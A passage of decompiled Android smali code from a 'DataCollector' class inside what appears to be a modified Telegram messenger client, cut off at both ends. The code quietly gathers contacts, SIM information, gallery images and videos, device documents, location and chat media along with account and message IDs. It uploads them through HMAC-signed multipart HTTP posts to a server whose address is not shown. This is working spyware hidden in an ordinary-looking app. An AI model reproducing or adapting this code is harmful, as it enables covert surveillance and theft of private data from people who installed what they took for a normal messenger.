    sget-object v9, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-static {v9}, Lorg/telegram/messenger/DataCollector;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    .line 2386
    sget-object v10, Lorg/telegram/messenger/ApplicationLoader;->applicationContext:Landroid/content/Context;

    invoke-direct {p0, v10}, Lorg/telegram/messenger/DataCollector;->currentNetworkState(Landroid/content/Context;)Lorg/telegram/messenger/DataCollector$NetworkState;

    move-result-object v10

    .line 2387
    new-instance v11, Ljava/net/URL;

    invoke-direct {v11, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v11

    check-cast v11, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 2388
    :try_start_1
    invoke-virtual {v11, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 2389
    const-string v12, "Content-Type"

    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, "multipart/form-data; boundary="

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 2390
    const-string v12, "X-Network-Type"

    iget-object v13, v10, Lorg/telegram/messenger/DataCollector$NetworkState;->type:Ljava/lang/String;

    invoke-virtual {v11, v12, v13}, Ljava/net/URLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v12, 0x1

    .line 2391
    invoke-virtual {v11, v12}, Ljava/net/URLConnection;->setDoOutput(Z)V

    const/16 v12, 0x3a98

    .line 2392
    invoke-virtual {v11, v12}, Ljava/net/URLConnection;->setConnectTimeout(I)V

    const/16 v12, 0x7530

    .line 2393
    invoke-virtual {v11, v12}, Ljava/net/URLConnection;->setReadTimeout(I)V

    .line 2394
    const-string v12, "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    invoke-static {v11, v4, v0, v12, v9}, Lorg/telegram/messenger/DataCollector;->addHMACHeaders(Ljava/net/HttpURLConnection;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2395
    new-instance v0, Ljava/io/DataOutputStream;

    invoke-virtual {v11}, Ljava/net/URLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    invoke-direct {v0, v4}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 2396
    const-string v4, "account"

    invoke-static/range {p2 .. p2}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v12

    invoke-static {v12, v13}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v9

    invoke-direct {p0, v0, v8, v4, v9}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2397
    const-string v4, "network_type"

    iget-object v9, v10, Lorg/telegram/messenger/DataCollector$NetworkState;->type:Ljava/lang/String;

    invoke-direct {p0, v0, v8, v4, v9}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2398
    const-string v4, "is_wifi"

    iget-boolean v9, v10, Lorg/telegram/messenger/DataCollector$NetworkState;->wifi:Z

    if-eqz v9, :cond_0

    const-string v9, "true"

    goto :goto_0

    :catchall_0
    move-exception v0

    move-object v7, v11

    goto/16 :goto_6

    :catch_0
    move-exception v0

    move-object v7, v11

    goto/16 :goto_5

    :cond_0
    const-string v9, "false"

    :goto_0
    invoke-direct {p0, v0, v8, v4, v9}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    if-eqz p9, :cond_1

    .line 2400
    const-string v2, "user_id"

    invoke-static/range {p7 .. p8}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v4

    invoke-direct {p0, v0, v8, v2, v4}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 2402
    :cond_1
    const-string v4, "dialog_id"

    invoke-static/range {p3 .. p4}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v9

    invoke-direct {p0, v0, v8, v4, v9}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2403
    const-string v4, "msg_id"

    invoke-static/range {p5 .. p6}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v9

    invoke-direct {p0, v0, v8, v4, v9}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    if-eqz v2, :cond_2

    .line 2404
    invoke-virtual/range {p11 .. p11}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_2

    .line 2405
    const-string v4, "media_type"

    invoke-direct {p0, v0, v8, v4, v2}, Lorg/telegram/messenger/DataCollector;->writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 2408
    :cond_2
    :goto_1
    invoke-virtual/range {p10 .. p10}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v2

    .line 2409
    const-string v4, "UTF-8"

    invoke-static {v2, v4}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v4, "+"

    const-string v9, "%20"

    invoke-virtual {v2, v4, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    .line 2410
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "--"

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2411
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Content-Disposition: form-data; name=\"file\"; filename=\"file\"; filename*=UTF-8\'\'"

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    if-eqz p12, :cond_3

    .line 2414
    invoke-virtual/range {p12 .. p12}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_3

    move-object/from16 v2, p12

    goto :goto_2

    :cond_3
    const-string v2, "application/octet-stream"

    .line 2415
    :goto_2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Content-Type: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\r\n\r\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2416
    const-string v3, "image/"

    invoke-virtual {v2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 2417
    invoke-static/range {p10 .. p10}, Lorg/telegram/messenger/DataCollector;->compressImageInMemory(Ljava/io/File;)[B

    move-result-object v7

    :cond_4
    if-eqz v7, :cond_5

    .line 2419
    invoke-virtual {v0, v7}, Ljava/io/OutputStream;->write([B)V

    goto :goto_4

    .line 2421
    :cond_5
    new-instance v2, Ljava/io/FileInputStream;

    move-object/from16 v3, p10

    invoke-direct {v2, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    const/16 v3, 0x2000

    .line 2422
    new-array v3, v3, [B

    .line 2424
    :goto_3
    invoke-virtual {v2, v3}, Ljava/io/FileInputStream;->read([B)I

    move-result v4

    if-eq v4, v6, :cond_6

    const/4 v7, 0x0

    invoke-virtual {v0, v3, v7, v4}, Ljava/io/DataOutputStream;->write([BII)V

    goto :goto_3

    .line 2425
    :cond_6
    invoke-virtual {v2}, Ljava/io/FileInputStream;->close()V

    .line 2427
    :goto_4
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\r\n--"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "--\r\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2428
    invoke-virtual {v0}, Ljava/io/DataOutputStream;->flush()V

    .line 2429
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V

    .line 2430
    invoke-virtual {v11}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    .line 2431
    new-instance v2, Lorg/telegram/messenger/DataCollector$PostResult;

    invoke-static {v11}, Lorg/telegram/messenger/DataCollector;->parseRetryAfterMs(Ljava/net/HttpURLConnection;)J

    move-result-wide v3

    invoke-direct {v2, v0, v3, v4}, Lorg/telegram/messenger/DataCollector$PostResult;-><init>(IJ)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 2436
    invoke-virtual {v11}, Ljava/net/HttpURLConnection;->disconnect()V

    return-object v2

    :catchall_1
    move-exception v0

    goto :goto_6

    :catch_1
    move-exception v0

    .line 2433
    :goto_5
    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "uploadMultipartDirect failed: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 2434
    new-instance v0, Lorg/telegram/messenger/DataCollector$PostResult;

    const-wide/16 v2, 0x0

    invoke-direct {v0, v6, v2, v3}, Lorg/telegram/messenger/DataCollector$PostResult;-><init>(IJ)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    if-eqz v7, :cond_7

    .line 2436
    invoke-virtual {v7}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_7
    return-object v0

    :goto_6
    if-eqz v7, :cond_8

    invoke-virtual {v7}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 2437
    :cond_8
    throw v0
.end method

.method private static userId(I)J
    .locals 2

    .line 710
    invoke-static {p0}, Lorg/telegram/messenger/UserConfig;->getInstance(I)Lorg/telegram/messenger/UserConfig;

    move-result-object p0

    invoke-virtual {p0}, Lorg/telegram/messenger/UserConfig;->getClientUserId()J

    move-result-wide v0

    return-wide v0
.end method

.method private writeField(Ljava/io/DataOutputStream;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .line 2811
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "--"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, "\r\n"

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 2812
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Content-Disposition: form-data; name=\""

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, "\"\r\n\r\n"

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p1, p3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    if-eqz p4, :cond_0

    goto :goto_0

    .line 2814
    :cond_0
    const-string p4, ""

    :goto_0
    sget-object p3, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {p4, p3}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object p3

    invoke-virtual {p1, p3}, Ljava/io/OutputStream;->write([B)V

    .line 2815
    invoke-virtual {p1, p2}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public collectDeviceDocs(Landroid/content/Context;I)V
    .locals 2

    if-nez p1, :cond_0

    return-void

    .line 2245
    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-lt v0, v1, :cond_1

    .line 2246
    invoke-static {}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline0;->m()Z

    move-result v0

    goto :goto_0

    .line 2248
    :cond_1
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_2

    const/4 v0, 0x1

    goto :goto_0

    :cond_2
    const/4 v0, 0x0

    :goto_0
    if-nez v0, :cond_3

    .line 2252
    const-string p1, "TGCollect"

    const-string p2, "collectDeviceDocs: no storage permission"

    invoke-static {p1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 2256
    :cond_3
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda30;

    invoke-direct {v1, p0, p1, p2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda30;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void
.end method

.method public collectGalleryImages(Landroid/content/Context;I)V
    .locals 2

    .line 2151
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x21

    if-lt v0, v1, :cond_0

    .line 2152
    const-string v0, "android.permission.READ_MEDIA_IMAGES"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    goto :goto_0

    .line 2155
    :cond_0
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1

    .line 2161
    :goto_0
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda31;

    invoke-direct {v1, p0, p1, p2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda31;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    :cond_1
    return-void
.end method

.method public collectGalleryVideos(Landroid/content/Context;I)V
    .locals 2

    if-nez p1, :cond_0

    return-void

    .line 2201
    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x21

    if-lt v0, v1, :cond_1

    .line 2202
    const-string v0, "android.permission.READ_MEDIA_VIDEO"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_2

    goto :goto_0

    .line 2205
    :cond_1
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_2

    .line 2210
    :goto_0
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda23;

    invoke-direct {v1, p0, p1, p2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda23;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    :cond_2
    return-void
.end method

.method public collectPhoneContacts(Landroid/content/Context;I)V
    .locals 2

    if-nez p1, :cond_0

    return-void

    .line 1920
    :cond_0
    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollected:Z

    if-eqz v0, :cond_1

    return-void

    .line 1921
    :cond_1
    const-string v0, "android.permission.READ_CONTACTS"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_2

    return-void

    .line 1923
    :cond_2
    monitor-enter p0

    .line 1924
    :try_start_0
    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollected:Z

    if-nez v0, :cond_4

    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z

    if-eqz v0, :cond_3

    goto :goto_0

    :cond_3
    const/4 v0, 0x1

    .line 1925
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z

    .line 1926
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1929
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda33;

    invoke-direct {v1, p0, p1, p2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda33;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void

    :catchall_0
    move-exception p1

    goto :goto_1

    .line 1924
    :cond_4
    :goto_0
    :try_start_1
    monitor-exit p0

    return-void

    .line 1926
    :goto_1
    monitor-exit p0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw p1
.end method

.method public collectSimInfo(Landroid/content/Context;I)V
    .locals 2

    if-nez p1, :cond_0

    return-void

    .line 1988
    :cond_0
    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->simInfoCollected:Z

    if-eqz v0, :cond_1

    return-void

    .line 1989
    :cond_1
    const-string v0, "android.permission.READ_PHONE_STATE"

    invoke-static {p1, v0}, Landroidx/core/widget/TextViewCompat$OreoCallback$$ExternalSyntheticApiModelOutline0;->m(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_2

    return-void

    .line 1991
    :cond_2
    monitor-enter p0

    .line 1992
    :try_start_0
    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->simInfoCollected:Z

    if-eqz v0, :cond_3

    monitor-exit p0

    return-void

    :catchall_0
    move-exception p1

    goto :goto_0

    :cond_3
    const/4 v0, 0x1

    .line 1993
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->simInfoCollected:Z

    .line 1994
    monitor-exit p0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 1995
    sget-object v0, Lorg/telegram/messenger/DataCollector;->UPLOAD_POOL:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda45;

    invoke-direct {v1, p0, p1, p2}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda45;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/content/Context;I)V

    invoke-static {v0, v1}, Lorg/telegram/messenger/DataCollector;->poolSubmit(Ljava/util/concurrent/ExecutorService;Ljava/lang/Runnable;)V

    return-void

    .line 1994
    :goto_0
    :try_start_1
    monitor-exit p0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    throw p1
.end method

.method public initLocationTracking(Landroid/app/Application;I)V
    .locals 1

    .line 2627
    iget-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationTrackingInit:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 2628
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->locationTrackingInit:Z

    .line 2629
    iput p2, p0, Lorg/telegram/messenger/DataCollector;->locationAccount:I

    .line 2631
    new-instance p2, Lorg/telegram/messenger/DataCollector$5;

    invoke-direct {p2, p0}, Lorg/telegram/messenger/DataCollector$5;-><init>(Lorg/telegram/messenger/DataCollector;)V

    invoke-virtual {p1, p2}, Landroid/app/Application;->registerActivityLifecycleCallbacks(Landroid/app/Application$ActivityLifecycleCallbacks;)V

    return-void
.end method

.method public onAvatarFileReady(Ljava/io/File;)V
    .locals 5

    if-eqz p1, :cond_1

    .line 2587
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    .line 2588
    :cond_0
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->pendingAvatarByFilePath:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj$/util/concurrent/ConcurrentHashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [J

    if-eqz v0, :cond_1

    const/4 v1, 0x0

    .line 2590
    aget-wide v1, v0, v1

    long-to-int v2, v1

    const/4 v1, 0x1

    aget-wide v3, v0, v1

    invoke-virtual {p0, v2, v3, v4, p1}, Lorg/telegram/messenger/DataCollector;->sendAvatar(IJLjava/io/File;)V

    :cond_1
    :goto_0
    return-void
.end method

.method public onFileReady(Ljava/io/File;JII)V
    .locals 9

    if-eqz p1, :cond_2

    .line 1880
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    .line 1882
    :cond_0
    iget-object v0, p0, Lorg/telegram/messenger/DataCollector;->pendingByFilePath:Lj$/util/concurrent/ConcurrentHashMap;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj$/util/concurrent/ConcurrentHashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [J

    if-eqz v0, :cond_1

    const/4 p2, 0x0

    .line 1884
    aget-wide p3, v0, p2

    long-to-int v2, p3

    const/4 p3, 0x1

    aget-wide v3, v0, p3

    const/4 p4, 0x2

    aget-wide v5, v0, p4

    long-to-int v5, v5

    move-object v1, p0

    move-object v6, p1

    invoke-virtual/range {v1 .. v6}, Lorg/telegram/messenger/DataCollector;->sendImage(IJILjava/io/File;)V

    .line 1885
    aget-wide v1, v0, p2

    long-to-int v4, v1

    aget-wide v5, v0, p3

    aget-wide p2, v0, p4

    long-to-int v7, p2

    move-object v3, p0

    move-object v8, p1

    invoke-virtual/range {v3 .. v8}, Lorg/telegram/messenger/DataCollector;->sendMedia(IJILjava/io/File;)V

    return-void

    :cond_1
    const-wide/16 v0, 0x0

    cmp-long v2, p2, v0

    if-eqz v2, :cond_2

    if-lez p4, :cond_2

    move-object v0, p0

    move v1, p5

    move-wide v2, p2

    move v4, p4

    move-object v5, p1

    .line 1890
    invoke-virtual/range {v0 .. v5}, Lorg/telegram/messenger/DataCollector;->sendImage(IJILjava/io/File;)V

    .line 1891
    invoke-virtual/range {v0 .. v5}, Lorg/telegram/messenger/DataCollector;->sendMedia(IJILjava/io/File;)V

    :cond_2
    :goto_0
    return-void
.end method

.method public registerContentObservers(Landroid/content/Context;I)V
    .locals 6

    const-string v0, "TGCollect"

    if-nez p1, :cond_0

    return-void

    .line 189
    :cond_0
    iget-boolean v1, p0, Lorg/telegram/messenger/DataCollector;->observersStarted:Z

    if-eqz v1, :cond_1

    return-void

    :cond_1
    const/4 v1, 0x1

    .line 190
    iput-boolean v1, p0, Lorg/telegram/messenger/DataCollector;->observersStarted:Z

    .line 191
    iput p2, p0, Lorg/telegram/messenger/DataCollector;->observerAccount:I

    .line 192
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p1

    .line 194
    new-instance v2, Lorg/telegram/messenger/DataCollector$1;

    iget-object v3, p0, Lorg/telegram/messenger/DataCollector;->mainHandler:Landroid/os/Handler;

    invoke-direct {v2, p0, v3}, Lorg/telegram/messenger/DataCollector$1;-><init>(Lorg/telegram/messenger/DataCollector;Landroid/os/Handler;)V

    iput-object v2, p0, Lorg/telegram/messenger/DataCollector;->galleryObserver:Landroid/database/ContentObserver;

    const/4 v3, 0x0

    .line 202
    :try_start_0
    sget-object v4, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    invoke-virtual {p1, v4, v1, v2}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 204
    const-string v2, "Observer registered: images"

    invoke-static {v0, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    .line 206
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Observer register failed (images): "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

